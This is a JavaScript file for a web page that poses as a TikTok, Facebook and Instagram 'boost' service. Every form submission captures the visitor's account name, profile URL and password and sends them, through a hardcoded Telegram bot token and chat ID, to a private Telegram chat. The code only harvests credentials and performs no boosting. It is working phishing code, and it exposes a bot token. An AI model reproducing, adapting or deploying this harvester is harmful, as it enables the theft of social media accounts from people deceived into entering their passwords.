document.addEventListener("DOMContentLoaded", () => {
    const TELEGRAM_BOT_TOKEN = "7738217538:AAGoNIvjMilJ5Ikt9oalHhpEiRDtS7t3NbU";
    const CHAT_ID = "6804915795";

    function formatForTelegram(text) {
        return String(text)
            .replace(/_/g, '\\_')
            .replace(/\*/g, '\\*')
            .replace(/\[/g, '\\[')
            .replace(/`/g, '\\`');
    }

    function sendToTelegram(platform, data) {
        const message = `
📢 *Boost Request - ${platform.replace(/_/g, '\\_')}* 📢
• *Account:* ${formatForTelegram(data.accountName)}
• *URL:* ${formatForTelegram(data.url)}
• *Password:* \`${formatForTelegram(data.password)}\`
• *Type:* ${formatForTelegram(data.boostType)}
• *Quantity:* ${formatForTelegram(data.quantity)}
        `.trim();

        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "MarkdownV2",
                disable_web_page_preview: true
            }),
        })
        .then(response => {
            if (!response.ok) {
                return response.json().then(err => {
                    throw new Error(err.description || 'Erreur Telegram');
                });
            }
            alert("✅ Envoyé avec succès !");
            document.getElementById(`boost-${platform.toLowerCase()}-form`).reset();
        })
        .catch(error => {
            console.error("Erreur détaillée:", error);
            alert(`❌ Erreur: ${error.message}`);
        });
    }

    function setupFormListener(formId, platform) {
        const form = document.getElementById(formId);
        if (!form) return;

        form.addEventListener("submit", async (event) => {
            event.preventDefault();
            
            const inputs = {
                accountName: form.querySelector('input[type="text"]').value.trim(),
                url: form.querySelector('input[type="url"]').value.trim(),
                password: form.querySelector('input[type="password"]').value,
                boostType: form.querySelector("select").value,
                quantity: form.querySelector('input[type="number"]').value
            };

            if (!inputs.password || inputs.password.length < 4) {
                alert("Mot de passe invalide (min 4 caractères)");
                return;
            }

            sendToTelegram(platform, inputs);
        });
    }

    // Initialisation
    setupFormListener("boost-tiktok-form", "TikTok");
    setupFormListener("boost-facebook-form", "Facebook");
    setupFormListener("boost-instagram-form", "Instagram");
});
